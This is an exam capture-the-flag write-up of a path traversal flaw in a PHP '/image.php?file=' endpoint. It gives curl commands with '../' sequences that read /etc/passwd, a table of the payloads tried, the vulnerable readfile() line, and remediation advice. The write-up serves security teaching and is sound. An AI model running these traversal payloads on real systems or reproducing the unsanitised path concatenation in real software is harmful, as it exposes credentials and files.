# Task 2 — Path Traversal / Arbitrary File Read

**CyberEd Portal — HackCamp 2026 Penetration Testing Exam**

| Field | Details |
|---|---|
| **Task** | 2 — File Read |
| **Category** | Web Application Security |
| **Vulnerability Class** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
| **Difficulty** | Low |
| **Target** | `<TARGET_URL>` |
| **Platform** | CyberEd Portal |
| **Group** | 362 |
| **Status** | Solved ✅ |

---

## Executive Summary

The **CyberEd Portal** application exposed an image-loading endpoint, `/image.php`, that accepted a user-controlled `file` parameter and passed it directly to a file-reading function without input sanitization or path validation. By supplying directory traversal sequences (`../`), it was possible to escape the intended static asset directory and read arbitrary files from the underlying filesystem — including `/etc/passwd`, which contained the exam flag.

This is a textbook **Path Traversal (CWE-22)** vulnerability leading to **Arbitrary File Read**, a high-impact finding capable of exposing credentials, configuration files, and source code in a production environment.

---

## Attack Chain

```
Image-loading functionality
        │
        ▼
  /image.php?file=
        │
        ▼
  Path Traversal (../)
        │
        ▼
  Arbitrary File Read
        │
        ▼
     /etc/passwd
        │
        ▼
        🚩 Flag
```

---

## 1. Reconnaissance — Identifying the Image-Loading Endpoint

The engagement began with a review of the application's front-end source to understand how static assets, particularly images, were served.

```bash
curl -s "<TARGET_URL>/" | grep -iE 'img|src=|image|file'
```

**Finding:** The page rendered image tags referencing a server-side PHP handler rather than a static file path:

```html
<img ... src="/image.php?file=apple-touch-icon-57x57.png">
```

The presence of a `file` query parameter passed directly to a PHP script is a strong indicator that the server may be reading files from disk based on unvalidated user input — a common precursor to path traversal vulnerabilities.

---

## 2. Vulnerability Testing — Path Traversal

To validate the hypothesis, the `file` parameter was manipulated with a directory traversal payload targeting a well-known system file:

```
../../../../../../etc/passwd
```

**Request:**

```bash
curl -s "<TARGET_URL>/image.php?file=../../../../../../etc/passwd"
```

**Result:** The server responded with the full contents of `/etc/passwd`, confirming an **unauthenticated arbitrary file read vulnerability**.

---

## 3. Exploitation — Flag Retrieval

The planted flag was appended as the final line of `/etc/passwd`. It was extracted directly from the response:

```
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
<THE_FLAG>
```

The extraction was also automated for repeatability:

```bash
curl -s "<TARGET_URL>/image.php?file=../../../../../../etc/passwd" \
  | grep -oE '[A-Za-z0-9]{32}'
```

---

## 4. Root Cause Analysis

The application concatenated user-supplied input directly onto a base directory path without any normalization, sanitization, or containment check:

```php
readfile("/var/www/html/static/" . $_GET['file']);
```

Because `../` sequences in the `file` parameter were not stripped or resolved against the base directory, the resulting path could escape `/var/www/html/static/` entirely:

```
/var/www/html/static/../../../../../../etc/passwd  →  /etc/passwd
```

**Vulnerable data flow:**

```
User Input → file parameter → Path Concatenation → readfile() → Disclosure
```

No allow-list, canonicalization (`realpath()`), or base-directory containment check was in place to ensure the resolved path stayed within the intended directory.

---

## 5. Payloads Evaluated

| Payload | Outcome | Notes |
|---|---|---|
| `../../../../../../etc/passwd` | ✅ **Success** | Escaped the static directory and reached `/etc/passwd` |
| `/etc/passwd` (absolute path) | ❌ Failed | Application prefixed input with its static directory: `/var/www/html/static//etc/passwd`, which does not exist |
| `php://filter/...` (PHP stream wrapper) | ❌ Failed | Path prefixing prevented the string from being interpreted as a valid wrapper |

---

## 6. Impact

An unauthenticated attacker exploiting this vulnerability could read any file accessible to the web server's process permissions, potentially exposing:

- Application configuration files and environment variables
- Hardcoded credentials or API keys
- Application source code
- System files (e.g., `/etc/passwd`, `/etc/shadow` if permissions allow)
- Other sensitive data stored on the host

In this exam scenario, exploitation was limited to reading `/etc/passwd` to retrieve the flag; in a real-world deployment, the same flaw could serve as a foothold for further compromise (e.g., credential harvesting → lateral movement).

**Severity:** High — unauthenticated, no interaction required, direct data exposure.

---

## 7. Remediation Recommendations

| Recommendation | Description |
|---|---|
| **Allow-list validation** | Map requested filenames to a fixed, pre-approved set of files/IDs rather than accepting raw filesystem paths. |
| **Path canonicalization** | Resolve the final path with `realpath()` and verify it still starts with the intended base directory before opening it. |
| **Strip traversal sequences** | Reject any input containing `../`, `..\`, or URL-encoded equivalents (`%2e%2e%2f`). |
| **Least privilege** | Run the web server process with minimal filesystem permissions to limit blast radius if traversal is achieved. |
| **WAF / input filtering** | Deploy a web application firewall rule set to detect and block traversal patterns as defense-in-depth. |

---

## 8. Flag

```
<THE_FLAG>
```

> Replace `<THE_FLAG>` with the flag from your exam deployment if publishing it is permitted by the exam's disclosure policy.

---

## 9. Lessons Learned

- Always inspect how an application loads auxiliary resources (images, documents, exports) — these endpoints are frequently overlooked for input validation.
- Any user-controlled parameter that resembles a filename or path should be treated as a potential path traversal vector.
- Absolute-path payloads can fail silently when an application prepends its own base directory — traversal sequences remain the more reliable test.
- Understanding *how* a path is constructed server-side (concatenation vs. canonicalization) is key to both exploiting and remediating the flaw.

---

## 10. Final Attack Path Summary

```
Target Website
      │
      ▼
Inspect image requests
      │
      ▼
Identify /image.php?file=
      │
      ▼
Test ../ traversal sequences
      │
      ▼
Read /etc/passwd
      │
      ▼
Extract flag
      │
      ▼
       🚩 FLAG CAPTURED
```
